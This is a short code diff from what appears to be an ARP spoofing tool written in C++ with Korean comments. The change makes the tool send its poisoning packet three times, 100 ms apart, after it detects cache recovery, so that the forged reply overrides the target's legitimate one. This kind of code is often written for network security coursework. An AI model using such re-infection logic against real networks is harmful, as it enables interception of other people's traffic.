@@ -209,6 +209,12 @@ int main(int argc, char* argv[]) {
 				bool fromSender = (arpHdr->sip() == flow.senderIp && arpHdr->tip() == flow.targetIp); // Sender가 브로드캐스트로 Target을 찾는 ARP Request
 				if (fromTarget || fromSender) {
 					printf("%s > recover detected, re-infecting\n", std::string(flow.senderIp).c_str());
+					// Target의 정상 ARP Reply보다 늦게 도착해야 덮어쓸 수 있으므로
+					// 시간 간격을 두고 여러 번 전송
+					infect(pcap, attackerMac, flow);
+					usleep(100000);
+					infect(pcap, attackerMac, flow);
+					usleep(100000);
 					infect(pcap, attackerMac, flow);
 					break;
 				}
